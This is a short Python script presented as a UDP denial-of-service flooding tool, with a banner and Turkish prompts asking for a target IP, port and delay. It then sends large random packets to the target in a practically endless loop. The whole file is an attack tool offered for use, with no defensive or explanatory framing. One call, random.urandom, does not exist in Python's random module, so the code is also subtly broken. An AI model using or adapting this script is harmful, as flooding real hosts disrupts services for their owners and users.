import socket, random, time


banner = ('''


                      [DoS Tool] [Project V1.0]
                           Başlatılıyor.....
                           [Author: N04X]


''')


print(banner)



s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

ip = input("N04X|DDoS Tool|Hedef IP -> ")
port = int(input("N04X|DDoS Tool|Hedef Port -> "))
sleep = float(input("N04X|DDoS Tool|Sleep -> "))

s.connect((ip, port))

for i in range (1, 100**1000):
    s.send(random.urandom(10)*1000)
    print(f"Send: {i}", end='\r')
    time.sleep(sleep)